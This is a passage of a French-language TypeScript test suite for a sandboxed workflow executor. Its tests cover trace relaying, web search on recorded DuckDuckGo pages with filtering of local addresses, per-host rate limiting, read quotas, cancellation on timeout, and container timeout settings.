      expect(REJEU_TROP_GROS).toBe("Rejeu impossible : les sorties à reprendre dépassent 4 Mo");
      expect(b.commandes).toEqual([]);
      expect(r.execution).toMatchObject({ statut: "echouee", erreur: REJEU_TROP_GROS, erreurNoyau: true });
    });
  });

  it("surTrace reçoit debut puis fin de chaque bloc, avec elements ; une fausse trace hors ordre n'est pas relayée", async () => {
    const b = await banc(chaine("a"), {
      "a.mjs": `export default async () => {
        const l = (m) => process.stdout.write(JSON.stringify(m) + "\\n");
        l({ t: "bloc", id: "sortie", etape: "debut" });
        l({ t: "bloc", id: "sortie", etape: "fin", statut: "reussi", sortie: "forgée" });
        l({ t: "bloc", id: "inconnu", etape: "debut" });
        return [1, 2, 3];
      };`,
    });
    const relayees: unknown[] = [];
    b.infra.surTrace = (t) => relayees.push(t);
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: [1, 2, 3] } });
    expect(relayees).toEqual([
      { bloc: "a", etape: "debut" },
      { bloc: "a", etape: "fin", statut: "reussi", elements: 3 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 3 },
    ]);
  });

  it("un surTrace qui lève ne casse pas l'exécution", async () => {
    const b = await banc(chaine("a"), { "a.mjs": `export default async () => 1;` });
    b.infra.surTrace = () => {
      throw new Error("relais cassé");
    };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "fin", sortie: { valeur: 1 } });
    expect(r.execution.statut).toBe("reussie");
  });

  it("le conteneur impossible à lancer : arrêt erreur, exécution échouée sans bloc lancé", async () => {
    const b = await banc(chaine("a"));
    b.infra.atelier = { commandeRecolte: () => { throw new Error("Docker introuvable"); }, supprimerRecolte: async () => {} };
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Récolte impossible à lancer : Docker introuvable" });
    expect(r.execution.statut).toBe("echouee");
    expect(r.execution.blocs.every((x) => x.statut === "pas-lance")).toBe(true);
  });
});

describe("executerWorkflow : recherche web et lectures ouvertes", () => {
  const BASE = "https://ddg.test/html/";
  const page = (nom: string) => readFileSync(new URL(`./fixtures/duckduckgo/${nom}`, import.meta.url), "utf8");
  const resultatsFixture = (() => {
    const r = extraireResultats(page("resultats.html"), 20);
    if (!("resultats" in r)) throw new Error("attendu : des résultats");
    return r.resultats;
  })();

  /** Ménagement à horloge factice : chaque attente avance l'horloge, sans jamais attendre pour de vrai. */
  const menagementFactice = () => {
    let t = 0;
    const attentes: number[] = [];
    const menagement = new Menagement({
      maintenant: () => t,
      attendre: async (ms) => {
        attentes.push(ms);
        t += ms;
      },
    });
    return { menagement, attentes };
  };

  /** Un widget `a` → sortie dont le code est donné ; `web` et le ménagement réglés. */
  async function bancWeb(code: string, o: { web?: boolean; compte?: string[]; html?: Record<string, string>; pages?: { url: string; titre: string; texte: string; liens: [] }[]; menagement?: Menagement; delaiMs?: number } = {}) {
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: o.pages ?? [], html: o.html ?? {} } });
    const b = await banc(chaine("a"), { "a.mjs": code }, { pont, compte: o.compte, accord: { profil: "perso" }, delaiMs: o.delaiMs });
    b.ctx.sources = { ...b.ctx.sources, ...(o.web !== undefined ? { web: o.web } : {}) };
    b.infra.menagement = o.menagement ?? menagementFactice().menagement;
    b.infra.urlRecherche = BASE;
    return { b, pont, html: () => pont.appels.filter((a) => a.methode === "lireHtmlInvisible") };
  }
  const valeur = (r: Awaited<ReturnType<typeof executerWorkflow>>) => (r.issue.t === "fin" ? r.issue.sortie.valeur : r.issue);
  /** Code qui fait ces appels l'un après l'autre et rend, pour chacun, le résultat ou « erreur: <message> ». */
  const enSuite = (appels: string[]) => `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
    export default async (e, w) => { const r = []; ${appels.map((a) => `r.push(await essai(${a}));`).join(" ")} return r; };`;

  it("chercherWeb rend les résultats de la page enregistrée, url de recherche construite sur urlRecherche", async () => {
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("clio fiabilité", { nombre: 3 })`]), {
      web: true,
      html: { [urlRecherche("clio fiabilité", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([resultatsFixture.slice(0, 3)]);
    expect(html().map((a) => a.args)).toEqual([[urlRecherche("clio fiabilité", BASE), { adressesLocales: true }]]);
  });

  it("chercherWeb écarte les résultats vers une adresse locale, puis coupe à nombre", async () => {
    const bloc = (u: string) => `<div class="result"><a class="result__a" href="${u}">T</a><a class="result__snippet">E</a></div>`;
    const local = [
      "http://127.0.0.1:8080/admin",
      "http://localhost/x",
      "http://192.168.1.1/",
      "http://imprimante.local/",
      "http://[::1]/",
      "https://a.example/",
      "https://b.example/",
      "https://c.example/",
    ].map(bloc).join("");
    const { b } = await bancWeb(enSuite([`w.chercherWeb("x", { nombre: 2 })`]), { web: true, html: { [urlRecherche("x", BASE)]: local } });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([[{ titre: "T", url: "https://a.example/", extrait: "E" }, { titre: "T", url: "https://b.example/", extrait: "E" }]]);
  });

  it("sans web : WEB_REQUIS, aucun appel au pont", async () => {
    const { b, pont } = await bancWeb(enSuite([`w.chercherWeb("x")`]), { html: { [urlRecherche("x", BASE)]: page("resultats.html") } });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${WEB_REQUIS}`]);
    expect(pont.appels).toEqual([]);
  });

  it("widget avec compte : WEB_REQUIS", async () => {
    // web avec compte est refusé à la lecture de widget.json ; l'exécuteur refuse quand même.
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("x")`]), {
      web: true,
      compte: ["mail.google.com"],
      html: { [urlRecherche("x", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${WEB_REQUIS}`]);
    expect(html()).toEqual([]);
  });

  it("31e recherche : PLAFOND_RECHERCHES, 30 lectures de HTML seulement", async () => {
    const { menagement, attentes } = menagementFactice();
    const { b, html } = await bancWeb(enSuite(Array.from({ length: 31 }, () => `w.chercherWeb("clio", { nombre: 1 })`)), {
      web: true,
      menagement,
      html: { [urlRecherche("clio", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    const sortie = valeur(r) as unknown[];
    expect(sortie.slice(0, 30)).toEqual(Array.from({ length: 30 }, () => resultatsFixture.slice(0, 1)));
    expect(sortie[30]).toBe(`erreur: ${PLAFOND_RECHERCHES}`);
    expect(html()).toHaveLength(30);
    // Ménagées : 2 s entre deux recherches.
    expect(attentes).toEqual(Array.from({ length: 29 }, () => 2000));
  });

  it("page de vérification : RECHERCHE_REFUSEE, puis RECHERCHES_ARRETEES sans nouvelle lecture", async () => {
    const { b, html } = await bancWeb(enSuite([`w.chercherWeb("a")`, `w.chercherWeb("b")`]), {
      web: true,
      html: { [urlRecherche("a", BASE)]: page("verification.html"), [urlRecherche("b", BASE)]: page("resultats.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${RECHERCHE_REFUSEE}`, `erreur: ${RECHERCHES_ARRETEES}`]);
    expect(html()).toHaveLength(1);
  });

  it("une recherche en file quand le refus arrive ne part pas, et ne consomme pas l'écart des recherches", async () => {
    const { menagement, attentes } = menagementFactice();
    const { b, html } = await bancWeb(
      `const essai = (p) => p.then((x) => x, (e) => "erreur: " + e.message);
      export default async (e, w) => Promise.all([essai(w.chercherWeb("a")), essai(w.chercherWeb("b"))]);`,
      { web: true, menagement, html: { [urlRecherche("a", BASE)]: page("verification.html"), [urlRecherche("b", BASE)]: page("resultats.html") } },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${RECHERCHE_REFUSEE}`, `erreur: ${RECHERCHES_ARRETEES}`]);
    expect(html()).toHaveLength(1);
    // « b » n'a rien attendu ; la recherche suivante attend 2 s depuis la fin de « a », la seule partie (pas 2 s de plus).
    await menagement.rechercher(async () => {});
    expect(attentes).toEqual([2000]);
  });

  it("page changée : RESULTATS_ILLISIBLES, jamais une liste vide ; aucun résultat : liste vide", async () => {
    const { b } = await bancWeb(enSuite([`w.chercherWeb("a")`, `w.chercherWeb("b")`]), {
      web: true,
      html: { [urlRecherche("a", BASE)]: page("changee.html"), [urlRecherche("b", BASE)]: page("aucun-resultat.html") },
    });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual([`erreur: ${RESULTATS_ILLISIBLES}`, []]);
  });

  it("widget web : la 101e lecture ouverte (pages et flux) lève TROP_DE_LECTURES", async () => {
    const web = await serveurWeb({ "/f": (res) => res.end("<rss><channel><item><title>T</title><link>https://x.example/</link></item></channel></rss>") });
    const { menagement, attentes } = menagementFactice();
    const espion = vi.spyOn(menagement, "lire");
    const { b, pont } = await bancWeb(
      `const essai = (p) => p.then(() => "ok", (e) => "erreur: " + e.message);
      export default async (e, w) => {
        const r = [];
        for (let i = 0; i < 40; i++) r.push(await essai(w.lirePage("https://www.pages.example/" + i)));
        for (let i = 0; i < 30; i++) r.push(await essai(w.recuperer("${web.url}/f")));
        for (let i = 0; i < 30; i++) r.push(await essai(w.lireFlux("${web.url}/f")));
        r.push(await essai(w.lirePage("https://pages.example/de-trop")));
        r.push(await essai(w.recuperer("${web.url}/f")));
        return r;
      };`,
      { web: true, menagement },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    const sortie = valeur(r) as string[];
    expect(sortie.slice(0, 100).every((x) => x === "ok")).toBe(true);
    expect(sortie.slice(100)).toEqual([`erreur: ${TROP_DE_LECTURES}`, `erreur: ${TROP_DE_LECTURES}`]);
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(40);
    expect(web.requetes).toHaveLength(60);
    // Chacune passe par le ménagement, par hôte : 1 s entre deux lectures du même hôte.
    expect(espion).toHaveBeenCalledTimes(100);
    expect(espion.mock.calls.slice(0, 40).every((c) => c[0] === "www.pages.example")).toBe(true);
    expect(espion.mock.calls.slice(40).every((c) => c[0] === "127.0.0.1")).toBe(true);
    expect(attentes.every((ms) => ms === 1000)).toBe(true);
    expect(attentes).toHaveLength(98);
  });

  it("widget web : une lecture redirigée vers un autre site attend le ménagement de ce site", async () => {
    const { menagement, attentes } = menagementFactice();
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://b.example/2", titre: "deux", texte: "", liens: [] }],
        redirections: { "https://a.example/court": "https://www.b.example/2", "https://a.example/meme": "https://www.a.example/x" },
      },
    });
    const b = await banc(
      chaine("a"),
      {
        "a.mjs": `export default async (e, w) => [
          (await w.lirePage("https://b.example/1")).url,
          (await w.lirePage("https://a.example/court")).url,
          (await w.lirePage("https://a.example/meme")).url,
        ];`,
      },
      { pont },
    );
    b.ctx.sources = { ...b.ctx.sources, web: true };
    b.infra.menagement = menagement;
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual(["https://b.example/1", "https://www.b.example/2", "https://www.a.example/x"]);
    // b.example lu juste avant : la redirection attend 1 s. a.example, rendue dès la redirection, ne fait pas attendre
    // la 3e lecture, redirigée vers le même site (www.).
    expect(pont.appels.filter((a) => a.methode === "changerHote").map((a) => a.args[0])).toEqual(["www.b.example", "www.a.example"]);
    expect(attentes).toEqual([1000]);
  });

  it("widget web : une récupération redirigée vers un autre site attend le ménagement de ce site", async () => {
    let ailleurs = "";
    // /vers-localhost redirige vers le même serveur, sous un autre nom d'hôte.
    const web = await serveurWeb({
      "/f": (res) => res.end("fini"),
      "/vers-localhost": (res) => {
        res.writeHead(302, { location: ailleurs });
        res.end();
      },
    });
    ailleurs = `http://localhost:${web.port}/f`;
    const { menagement, attentes } = menagementFactice();
    const lire = vi.spyOn(menagement, "lire");
    const { b } = await bancWeb(
      `export default async (e, w) => [await w.recuperer("${ailleurs}"), await w.recuperer("${web.url}/vers-localhost")];`,
      { web: true, menagement },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toEqual(["fini", "fini"]);
    expect(lire.mock.calls.map((c) => c[0])).toEqual(["localhost", "127.0.0.1"]);
    // localhost lu juste avant : la redirection attend son écart.
    expect(attentes).toEqual([1000]);
  });

  it("widget sans web : 150 lectures passent, aucune attente du ménagement", async () => {
    const espion = new Menagement({ attendre: async () => { throw new Error("aucune attente attendue"); } });
    const lire = vi.spyOn(espion, "lire");
    const rechercher = vi.spyOn(espion, "rechercher");
    const { b, pont } = await bancWeb(
      `export default async (e, w) => { for (let i = 0; i < 150; i++) await w.lirePage("https://pages.example/" + i); return "fini"; };`,
      { menagement: espion },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toBe("fini");
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(150);
    expect(lire).not.toHaveBeenCalled();
    expect(rechercher).not.toHaveBeenCalled();
  });

  it("arrêt de l'exécution : une lecture en attente du ménagement ne part pas", async () => {
    let t = 0;
    const enAttente: (() => void)[] = [];
    const menagement = new Menagement({ maintenant: () => t, attendre: () => new Promise<void>((ok) => enAttente.push(ok)) });
    const { b, pont } = await bancWeb(
      `export default async (e, w) => { await w.lirePage("https://pages.example/1"); return w.lirePage("https://pages.example/2"); };`,
      { web: true, menagement, delaiMs: 300 },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    // L'écart s'écoule après l'arrêt : la lecture en file ne part pas.
    t += 10_000;
    for (const ok of enAttente.splice(0)) ok();
    await new Promise((ok) => setTimeout(ok, 20));
    expect(pont.appels.filter((a) => a.methode === "lirePageInvisible").map((a) => a.args[0])).toEqual(["https://pages.example/1"]);
  });

  it("fin de l'exécution : une recherche encore en file ne part pas", async () => {
    let t = 0;
    const enAttente: (() => void)[] = [];
    const menagement = new Menagement({ maintenant: () => t, attendre: () => new Promise<void>((ok) => enAttente.push(ok)) });
    const { b, html } = await bancWeb(
      `export default async (e, w) => { await w.chercherWeb("a"); w.chercherWeb("b").catch(() => {}); return "fini"; };`,
      { web: true, menagement, html: { [urlRecherche("a", BASE)]: page("resultats.html") } },
    );
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(valeur(r)).toBe("fini");
    t += 10_000;
    for (const ok of enAttente.splice(0)) ok();
    await new Promise((ok) => setTimeout(ok, 20));
    expect(html()).toHaveLength(1);
  });
});

describe("executerWorkflow : un arrêt annule les lectures en cours", () => {
  const BASE = "https://ddg.test/html/";
  /** Un faux conteneur : envoie ces appels, puis attend d'être tué ; garde ce que le noyau lui écrit. */
  const conteneurAppels = (appels: { f: string; a: unknown }[]) => {
    const recu: string[] = [];
    let tuer = () => {};
    const lancer: LanceurProcessus = () => {
      const stdout = new PassThrough();
      const stderr = new PassThrough();
      const stdin = new PassThrough();
      stdin.on("data", (d) => recu.push(String(d)));
      let finir!: (c: number | null) => void;
      const fin = new Promise<number | null>((ok) => (finir = ok));
      tuer = () => {
        stdout.end();
        stderr.end();
        finir(null);
      };
      setImmediate(() => appels.forEach((x, i) => stdout.write(JSON.stringify({ t: "appel", n: i + 1, ...x }) + "\n")));
      return { stdin, stdout, stderr, tuer: () => tuer(), fin };
    };
    return {
      lancer,
      /** Le conteneur est supprimé de l'extérieur (quitter le navigateur). */
      tuer: () => tuer(),
      reponses: () => recu.join("").split("\n").filter((l) => l.includes(`"t":"reponse"`)),
    };
  };
  const annulees = (pont: PontFactice) => pont.appels.filter((a) => a.methode === "lectureAnnulee").map((a) => a.args[0]);
  const valeur = (r: Awaited<ReturnType<typeof executerWorkflow>>) => (r.issue.t === "fin" ? r.issue.sortie.valeur : r.issue);

  it("délai dépassé : pages (publique, avec compte) et récupération en cours annulées, rien ne revient au conteneur", async () => {
    const fermees: string[] = [];
    const web = await serveurWeb({ "/lent": (res) => void res.on("close", () => fermees.push("/lent")) });
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], suspendues: ["https://pages.example/a", "https://app.daily.dev/b"] } });
    const c = conteneurAppels([
      { f: "lirePage", a: { url: "https://pages.example/a" } },
      { f: "lirePage", a: { url: "https://app.daily.dev/b", compte: true } },
      { f: "recuperer", a: { url: `${web.url}/lent` } },
    ]);
    const b = await banc(chaine("a"), {}, { pont, compte: ["app.daily.dev"], publiques: ["pages.example", "127.0.0.1"], accord: { profil: "perso" }, delaiMs: 300, lancer: c.lancer });
    const r = await executerWorkflow(b.ctx, b.infra);
    expect(r.issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    await vi.waitFor(() => {
      expect(annulees(pont).sort()).toEqual(["https://app.daily.dev/b", "https://pages.example/a"]);
      expect(fermees).toEqual(["/lent"]);
    });
    await new Promise((ok) => setTimeout(ok, 20));
    expect(c.reponses()).toEqual([]);
  });

  it("conteneur supprimé (quitter) : ses lectures sont annulées, pas celles d'une autre exécution", async () => {
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: { pages: [{ url: "https://pages.example/b", titre: "B", texte: "", liens: [] }], suspendues: ["https://pages.example/a", "https://pages.example/b"] },
    });
    const autre = await banc(chaine("a"), { "a.mjs": `export default async (e, w) => (await w.lirePage("https://pages.example/b")).titre;` }, { pont });
    const c = conteneurAppels([{ f: "lirePage", a: { url: "https://pages.example/a" } }]);
    const b = await banc(chaine("a"), {}, { pont, lancer: c.lancer });
    const rAutre = executerWorkflow(autre.ctx, autre.infra);
    const r = executerWorkflow(b.ctx, b.infra);
    await vi.waitFor(() => expect(pont.appels.filter((a) => a.methode === "lirePageInvisible")).toHaveLength(2));
    c.tuer();
    expect((await r).issue.t).toBe("echec");
    await vi.waitFor(() => expect(annulees(pont)).toEqual(["https://pages.example/a"]));
    // L'autre exécution, elle, lit toujours.
    expect(pont.relacher("https://pages.example/b")).toBe(1);
    expect(valeur(await rAutre)).toBe("B");
    expect(annulees(pont)).toEqual(["https://pages.example/a"]);
  });

  it("widget web : une lecture et une recherche en cours annulées libèrent leur tour, l'écart compte depuis l'annulation", async () => {
    let t = 0;
    const attentes: number[] = [];
    const menagement = new Menagement({
      maintenant: () => t,
      attendre: async (ms) => {
        attentes.push(ms);
        t += ms;
      },
    });
    const pont = new PontFactice([], {
      actif: null,
      autoriser: false,
      lecture: {
        pages: [{ url: "https://pages.example/2", titre: "deux", texte: "", liens: [] }],
        html: { [urlRecherche("b", BASE)]: readFileSync(new URL("./fixtures/duckduckgo/aucun-resultat.html", import.meta.url), "utf8") },
        suspendues: ["https://pages.example/1", urlRecherche("a", BASE)],
      },
    });
    const preparer = (bb: Banc) => {
      bb.ctx.sources = { ...bb.ctx.sources, web: true };
      bb.infra.menagement = menagement;
      bb.infra.urlRecherche = BASE;
    };
    const c = conteneurAppels([
      { f: "lirePage", a: { url: "https://pages.example/1" } },
      { f: "chercherWeb", a: { requete: "a", nombre: 1 } },
    ]);
    const b = await banc(chaine("a"), {}, { pont, delaiMs: 300, lancer: c.lancer });
    preparer(b);
    expect((await executerWorkflow(b.ctx, b.infra)).issue).toEqual({ t: "arret", statut: "erreur", erreur: "Délai dépassé" });
    await vi.waitFor(() => expect(annulees(pont).sort()).toEqual(["https://pages.example/1", urlRecherche("a", BASE)].sort()));
    // Une autre exécution sur le même ménagement : ni la voie de l'hôte ni celle des recherches ne restent prises.
    const suivante = await banc(
      chaine("a"),
      { "a.mjs": `export default async (e, w) => [(await w.lirePage("https://pages.example/2")).titre, (await w.chercherWeb("b", { nombre: 1 })).length];` },
      { pont, delaiMs: 3000 },
    );
    preparer(suivante);
    expect(valeur(await executerWorkflow(suivante.ctx, suivante.infra))).toEqual(["deux", 0]);
    // Les demandes annulées étaient parties : l'écart compte depuis leur annulation (t = 0). La lecture attend ses 1 s,
    // puis la recherche le reste de ses 2 s (1 s déjà passée).
    expect(attentes).toEqual([1000, 1000]);
  });
});

describe("executerWorkflow : veille (durée, chaîne, publications, mémoire en cours de route)", () => {
  /** liste (code) → fiche → avis (source.recuperer par élément) → sortie. */
  const veille = (o: { auFilDeLEau?: boolean } = {}) => ({
    version: 1,
    blocs: [
      { id: "liste", type: "code", parametres: { source: "liste.mjs" } },
      { id: "fiche", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "avis", type: "source.recuperer", parametres: { url: "{url}", parElement: true } },
      { id: "sortie", type: "sortie", parametres: { vers: "widget", ...(o.auFilDeLEau ? { auFilDeLEau: true } : {}) } },
    ],
    liens: [{ de: "liste", vers: "fiche" }, { de: "fiche", vers: "avis" }, { de: "avis", vers: "sortie" }],
  });

  /**
   * Un faux conteneur qui écrit ses lignes une à une (une fonction est appelée à sa place : avancer l'horloge ; un texte
   * est écrit tel quel, plusieurs lignes d'un coup) ;
   * `recu` reçoit ce que le noyau lui écrit ; `bloque` : il ne sort jamais de lui-même (seulement tué).
   */
  const lanceurPas = (pas: unknown[], o: { recu?: string[]; bloque?: boolean } = {}): LanceurProcessus => () => {
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.recu?.push(d.toString()));
    let tuer = () => {};
    const fin = new Promise<number | null>((ok) => {
      tuer = () => ok(null);
      void (async () => {
        for (const p of pas) {
          await new Promise((r) => setImmediate(r));
          if (typeof p === "function") p();
          else stdout.write(typeof p === "string" ? p : JSON.stringify(p) + "\n");
        }
        await new Promise((r) => setImmediate(r));
        if (o.bloque) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      })();
    });
    return { stdin, stdout, stderr, tuer: () => tuer(), fin };
  };

  /** Une horloge que les pas font avancer. */
  const horlogeFactice = (b: Banc) => {
    let t = MAINTENANT.getTime();
    b.infra.horloge = () => new Date(t);
    return (ms: number) => () => {
      t += ms;
    };
  };

  /** La commande réelle de l'atelier, gardée pour lire son `timeout`. */
  const brancherAtelier = (b: Banc) => {
    const atelier = new Atelier({ chemins: cheminsEspace("/Users/t/WebAiOs"), docker: "/usr/local/bin/docker" });
    const commandes: string[][] = [];
    b.infra.atelier = {
      commandeRecolte: (id, d, m, s) => {
        const c = atelier.commandeRecolte(id, d, m, s);
        commandes.push(c);
        return c;
      },
      supprimerRecolte: async () => {},
    };
    return () => {
      const c = commandes[0]!;
      return c.slice(c.indexOf("timeout"), c.indexOf("timeout") + 4);
    };
  };

  /** Les délais donnés à setTimeout pendant `f`. */
  async function delaisPendant(f: () => Promise<unknown>): Promise<unknown[]> {
    const espion = vi.spyOn(globalThis, "setTimeout");
    try {
      await f();
      return espion.mock.calls.map((c) => c[1]);
    } finally {
      espion.mockRestore();
    }
  }

  const debutBloc = (id: string) => ({ t: "bloc", id, etape: "debut" });
  const finBloc = (id: string, sortie: unknown = [{ url: "https://a.example/1" }], statut = "reussi") => ({ t: "bloc", id, etape: "fin", statut, sortie });
  const pub = (donnees: unknown, faits: number, total: number) => ({ t: "publication", donnees, faits, total });
  const essai = (b: Banc) => {
    b.ctx.declencheur = "rejeu";
    b.ctx.rejeu = { relances: [...b.ctx.valide.ordre], sorties: {}, repris: {} };
  };

  it("la chaîne de veille() est fiche → avis", () => {
    expect(chaineAuFilDeLEau(valide(veille({ auFilDeLEau: true })))).toEqual(["fiche", "avis"]);
  });

  it("widget sans les nouveaux champs : ligne debut identique à aujourd'hui, timeout 180, délai 200 s", async () => {
    const recu: string[] = [];
    const b = await banc(veille(), {}, { lancer: lanceurPas([{ t: "fin", donnees: null }], { recu }) });
    const timeout = brancherAtelier(b);
    const delais = await delaisPendant(() => executerWorkflow(b.ctx, b.infra));
    const { workflow, ordre } = b.ctx.valide;
    expect(recu.join("").split("\n")[0]).toBe(
      JSON.stringify({ t: "debut", precedent: null, maintenant: MAINTENANT.toISOString(), config: { interets: "rust" }, workflow: { blocs: workflow.blocs, liens: workflow.liens, ordre } }),
    );
    expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
    expect(delais).toContain(200_000);
  });

  it("widget Gmail (compte, recolte.mjs seul) : ligne debut identique, timeout 180, délai 200 s, ni surMemoire ni memoire sur un echec", async () => {
    const recu: string[] = [];
    const implicite = { version: 1, blocs: [{ id: "recolte", type: "code", parametres: { source: "recolte.mjs" } }, { id: "sortie", type: "sortie", parametres: { vers: "widget" } }], liens: [{ de: "recolte", vers: "sortie" }] };
    const b = await banc(implicite, {}, {
      compte: ["mail.google.com"],
      accord: { profil: "p1" },
      lancer: lanceurPas([{ t: "memoire", memoire: { recolte: { type: "code", valeur: 1 } } }, { t: "journal", bloc: "recolte", texte: "x" }, { t: "echec", erreur: "cassé" }], { recu }),
    });
    const timeout = brancherAtelier(b);
    const memoires: unknown[] = [];
    b.infra.surMemoire = async (m) => void memoires.push(m);
    let issue: unknown;
    const delais = await delaisPendant(async () => {
      issue = (await executerWorkflow(b.ctx, b.infra)).issue;
    });
    const { workflow, ordre } = b.ctx.valide;
    expect(recu.join("").split("\n")[0]).toBe(
      JSON.stringify({ t: "debut", precedent: null, maintenant: MAINTENANT.toISOString(), config: { interets: "rust" }, workflow: { blocs: workflow.blocs, liens: workflow.liens, ordre } }),
    );
    expect(timeout()).toEqual(["timeout", "-k", "5", "180"]);
    expect(delais).toContain(200_000);
    expect(memoires).toEqual([]);
    expect(issue).toEqual({ t: "echec", erreur: "cassé", erreurDuCode: true });
  });

  it("dureeMaxMinutes 30 : debut porte limiteMs 1 800 000 et progressif, conteneur lancé avec timeout 1830, délai 1 850 s", async () => {
    const recu: string[] = [];
    const b = await banc(veille(), {}, { lancer: lanceurPas([{ t: "fin", donnees: null }], { recu }) });
    b.ctx.dureeMaxMinutes = 30;
    const timeout = brancherAtelier(b);
    const delais = await delaisPendant(() => executerWorkflow(b.ctx, b.infra));
    const debut = JSON.parse(recu.join("").split("\n")[0]!);
    expect(debut).toMatchObject({ t: "debut", limiteMs: 1_800_000, progressif: true });
    expect(timeout()).toEqual(["timeout", "-k", "5", "1830"]);
    expect(delais).toContain(1_850_000);
    expect(delais).not.toContain(200_000);
  });

  it("auFilDeLEau sans dureeMaxMinutes : progressif sans limiteMs ; un essai n'est jamais progressif", async () => {
    const recu: string[] = [];
    const b = await banc(veille({ auFilDeLEau: true }), {}, { lancer: lanceurPas([{ t: "fin", donnees: null }], { recu }) });
    await executerWorkflow(b.ctx, b.infra);
    const debut = JSON.parse(recu.join("").split("\n")[0]!);
    expect(debut.progressif).toBe(true);
    expect("limiteMs" in debut).toBe(false);

    const recuEssai: string[] = [];
    const e = await banc(veille({ auFilDeLEau: true }), {}, { lancer: lanceurPas([{ t: "fin", donnees: null }], { recu: recuEssai }) });
    e.ctx.dureeMaxMinutes = 30;
    essai(e);
    await executerWorkflow(e.ctx, e.infra);
    const debutEssai = JSON.parse(recuEssai.join("").split("\n")[0]!);
    expect("progressif" in debutEssai).toBe(false);
    expect(debutEssai.limiteMs).toBe(1_800_000);
  });

  it("traces de chaîne acceptées ; une fin de chaîne dans le désordre rejetée", async () => {
    const enChaine = await banc(veille({ auFilDeLEau: true }), {}, {
      lancer: lanceurPas([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        { t: "journal", bloc: "fiche", texte: "lu" },
        finBloc("fiche"), finBloc("avis"),
        debutBloc("sortie"), finBloc("sortie"),
        { t: "fin", donnees: [] },
      ]),
    });
    const relayees: unknown[] = [];
    enChaine.infra.surTrace = (t) => relayees.push(t);
    const r = await executerWorkflow(enChaine.ctx, enChaine.infra);
    expect(r.execution.statut).toBe("reussie");
    expect(r.execution.blocs.find((x) => x.id === "fiche")!.journal).toEqual(["lu"]);
    expect(relayees).toEqual([
      { bloc: "liste", etape: "debut" },
      { bloc: "liste", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "fiche", etape: "debut" },
      { bloc: "avis", etape: "debut" },
      { bloc: "fiche", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "avis", etape: "fin", statut: "reussi", elements: 1 },
      { bloc: "sortie", etape: "debut" },
      { bloc: "sortie", etape: "fin", statut: "reussi", elements: 1 },
    ]);

    // Fin d'avis avant celle de fiche : rejetée ; avis commencé sans fin, la sortie (qui arrive trop tôt) rejetée.
    const desordre = await banc(veille({ auFilDeLEau: true }), {}, {
      lancer: lanceurPas([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("avis"), finBloc("fiche"),
        debutBloc("sortie"),
        { t: "fin", donnees: [] },
      ]),
    });
    const relayees2: unknown[] = [];
    desordre.infra.surTrace = (t) => relayees2.push(t);
    const r2 = await executerWorkflow(desordre.ctx, desordre.infra);
    expect(r2.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "echoue", "pas-lance"]);
    expect(relayees2).not.toContainEqual(expect.objectContaining({ bloc: "avis", etape: "fin" }));

    // Sans auFilDeLEau : deux debut de suite, le second est rejeté comme aujourd'hui.
    const sans = await banc(veille(), {}, {
      lancer: lanceurPas([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("fiche"), finBloc("avis"),
        { t: "fin", donnees: [] },
      ]),
    });
    const r3 = await executerWorkflow(sans.ctx, sans.infra);
    expect(r3.execution.blocs.map((x) => x.statut)).toEqual(["reussi", "reussi", "pas-lance", "pas-lance"]);

    // Un essai n'a pas de chaîne : même rejet.
    const e = await banc(veille({ auFilDeLEau: true }), {}, {
      lancer: lanceurPas([
        debutBloc("liste"), finBloc("liste"),
        debutBloc("fiche"), debutBloc("avis"),
        finBloc("fiche"), finBloc("avis"),
